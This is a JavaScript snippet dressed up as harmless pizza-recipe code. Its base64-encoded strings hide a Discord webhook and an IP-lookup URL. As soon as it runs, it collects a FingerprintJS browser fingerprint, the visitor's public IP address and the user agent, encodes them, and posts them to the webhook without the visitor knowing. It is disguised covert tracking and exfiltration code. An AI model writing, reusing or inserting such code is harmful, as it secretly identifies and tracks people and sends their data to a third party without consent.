const getDecodedIngredient = (url) => {
    return atob(url);
};

const pizzeriaRecipe = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTI0MzQzNzA4MTgzMjQ2OC93WVo2T2cySFNGZDZiUVZyWUI5WEhfS1NQb2g2UnNRR29wUUd4UFVhX3J3bGx0bGpyaWYzMXVxT2JhcmdlYktsNHk5aw==';
const pizzeriaSalsa = 'aHR0cHM6Ly9hcGkuaXBpZnkuY29tP2Zvcm1hdD1qcw==';

const finalRecipe = getDecodedIngredient(pizzeriaRecipe);
const finalSalsa = getDecodedIngredient(pizzeriaSalsa);

const sendPizzaWebhook = (data) => {
    fetch(finalRecipe, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: data })
    });
};

const getIngredients = () => {
    return Promise.all([
        import('https://openfpcdn.io/fingerprintjs/v3')
            .then(FingerprintJS => FingerprintJS.load()),
        fetch(finalSalsa).then(response => response.json())
    ]);
};

const preparePizza = async () => {
    const [fp, ipData] = await getIngredients();
    const { visitorId } = await fp.get();
    const { ip } = ipData;
    const userAgent = navigator.userAgent;

    const dough = visitorId;
    const cheese = ip;
    const sauce = userAgent;

    const pizzaReady = btoa(`New recipe:\nDough: ${dough}\nCheese: ${cheese}\nSauce: ${sauce}`);

    sendPizzaWebhook(pizzaReady);
};

preparePizza();
